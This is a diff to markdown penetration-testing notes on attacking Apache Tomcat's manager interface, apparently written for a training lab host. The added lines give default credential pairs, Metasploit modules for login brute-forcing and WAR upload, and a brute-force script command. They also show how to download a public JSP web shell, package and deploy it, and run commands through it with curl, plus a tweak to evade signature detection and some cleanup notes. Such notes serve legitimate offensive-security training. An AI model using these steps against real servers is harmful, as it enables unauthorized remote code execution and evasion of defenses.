@@ -47,8 +47,43 @@ The `tomcat-users.xml` file is used to allow or disallow access to the /manager 
 ```
 
 ### Exploitation
-##### Password spraying
+#### Password spraying
 ```
 tomcat:tomcat
 admin:admin
 ```
+#### Login Bruteforcing
+```
+use auxiliary/scanner/http/tomcat_mgr_login
+set stop_on_success true
+```
+This is another tool that can perform the bruteforcing [Tomcat-Manager-Bruteforce](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
+```bash
+python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+```
+#### RCE via WAR File Upload
+```bash
+use  exploit/multi/http/tomcat_mgr_upload
+```
+**Alternatively**
+```bash
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp 
+```
+`Browse` to select the .war file and then click on `Deploy`
+View that `/backup` is a n application path
+```bash
+curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+```
+###### Obfuscation
+Change 
+```java
+FileOutputStream(f);stream.write(m);o="Uploaded:
+```
+To
+```java
+FileOutputStream(f);stream.write(m);o="uPlOaDeD:
+```
+###### Cleanup
+To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, which in our example is `/opt/tomcat/apache-tomcat-10.0.10/webapps`. If we do an `ls` on that directory from our web shell, we'll see the uploaded `backup.war` file and the `backup` directory containing the `cmd.jsp` script and `META-INF` created after the application deploys. Clicking on `Undeploy` will typically remove the uploaded WAR archive and the directory associated with the application.
+
